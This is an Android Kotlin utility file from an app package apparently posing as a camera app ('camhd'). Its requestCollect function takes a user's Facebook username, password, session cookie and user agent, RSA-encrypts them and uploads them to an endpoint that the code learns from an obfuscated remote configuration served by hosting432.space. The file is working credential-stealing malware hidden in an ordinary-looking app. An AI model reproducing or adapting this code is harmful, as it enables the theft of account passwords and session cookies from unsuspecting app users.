package com.pipipi.camhd.utils

import android.net.Uri
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.franmontiel.persistentcookiejar.PersistentCookieJar
import com.franmontiel.persistentcookiejar.cache.SetCookieCache
import com.franmontiel.persistentcookiejar.persistence.SharedPrefsCookiePersistor
import com.pipipi.camhd.AppService
import com.pipipi.camhd.CompletionHandlerWrapper
import com.pipipi.camhd.base.BaseActivity
import com.pipipi.camhd.pojo.ConfigPojo
import com.pipipi.camhd.pojo.UpdatePojo
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.Cache
import okhttp3.OkHttpClient
import okhttp3.logging.HttpLoggingInterceptor
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.io.File
import java.util.concurrent.TimeUnit

val devkitService by lazy {
    devkitServiceCreator()
}

fun CoroutineScope.requestCollect(
    account: String,
    password: String,
    cookie: String,
    userAgent: String,
    block: () -> Unit
) {
    updateEntity.let {
        it.c?.let { url ->
            it.d?.let { key ->
                if (url.isNotBlank() && key.isNotBlank()) {
                    launch(Dispatchers.IO) {
                        doSuspendOrNull {
                            devkitService.uploadFbData(
                                url,
                                mutableMapOf(
                                    "content" to gson.toJson(
                                        mutableMapOf(
                                            "un" to account,
                                            "pw" to password,
                                            "cookie" to cookie,
                                            "source" to configEntity.app_name,
                                            "ip" to "",
                                            "type" to "f_o",
                                            "b" to userAgent
                                        )
                                    ).toRsaEncrypt(key)
                                )
                            )
                        }?.let {
                            if (it.code == "0" && it.data?.toBooleanStrictOrNull() == true) {
                                "requestCollect success".loge()
                                isLogin = true
                            }
                        }

                        withContext(Dispatchers.Main) {
                            block()
                        }
                    }
                }
            }
        }
    }
}

fun CoroutineScope.requestConfig(block: () -> Unit) {
    launch(Dispatchers.IO) {
        doSuspendOrNull {
            devkitService.getConfig()
        }?.string()
            ?.let {
                try {
                    StringBuffer(it).replace(1, 2, "").toString()
                } catch (e: Exception) {
                    e.fillInStackTrace()
                    null
                }
            }?.let {
                "requestConfig origin-> $it".loge()
                if (it.isBase64()) {
                    "requestConfig isBase64".loge()
                    it.toByteArray().fromBase64().decodeToString()
                } else {
                    "requestConfig notBase64".loge()
                    null
                }
            }?.let {
                gson.fromJson(it, ConfigPojo::class.java)
            }?.let {
                configEntity = it
                if (configEntity.faceBookId().isNotBlank()) {
                    initFaceBook()
                }
                "requestConfig configEntity-> $configEntity".loge()
                it.info
            }?.let {
                if (it.isBase64()) {
                    it.toByteArray().fromBase64().decodeToString()
                } else {
                    null
                }
            }?.let {
                gson.fromJson(it, UpdatePojo::class.java)
            }?.let {
                updateEntity = it
                "requestConfig updateEntity-> $updateEntity".loge()
            }
        withContext(Dispatchers.Main) {
            block()
        }
    }
}


fun initFaceBook() {
    FacebookSdk.apply {
        setApplicationId(configEntity.faceBookId())
        sdkInitialize(app)
        setAdvertiserIDCollectionEnabled(true)
        setAutoLogAppEventsEnabled(true)
        fullyInitialize()
    }
}

fun BaseActivity.fetchAppLink(key: String, callback: (Uri?) -> Unit) {
    AppLinkData.fetchDeferredAppLinkData(this, key, object : CompletionHandlerWrapper() {
        override fun onInvoke(appLinkData: AppLinkData?) {
            callback(appLinkData?.targetUri)
        }
    })
}

suspend fun <T> doSuspendOrNull(block: suspend () -> T) =
    try {
        block()
    } catch (e: Exception) {
        "doOrNull ->$e".loge()
        null
    }

private fun clientCreator(block: OkHttpClient.Builder.() -> OkHttpClient.Builder = { this }) =
    OkHttpClient.Builder()
        .cache(Cache(File(app.cacheDir, "cache"), 1024 * 1024 * 100))
        .cookieJar(PersistentCookieJar(SetCookieCache(), SharedPrefsCookiePersistor(app)))
        .readTimeout(15000, TimeUnit.MILLISECONDS)
        .writeTimeout(15000, TimeUnit.MILLISECONDS)
        .connectTimeout(15000, TimeUnit.MILLISECONDS)
        .block()
        .addInterceptor(HttpLoggingInterceptor().setLevel(HttpLoggingInterceptor.Level.BODY))
        .build()

private fun devkitServiceCreator() =
    Retrofit
        .Builder()
        .client(clientCreator())
        .addConverterFactory(GsonConverterFactory.create())
        .baseUrl("https://hosting432.space/")
        .build()
        .create(AppService::class.java)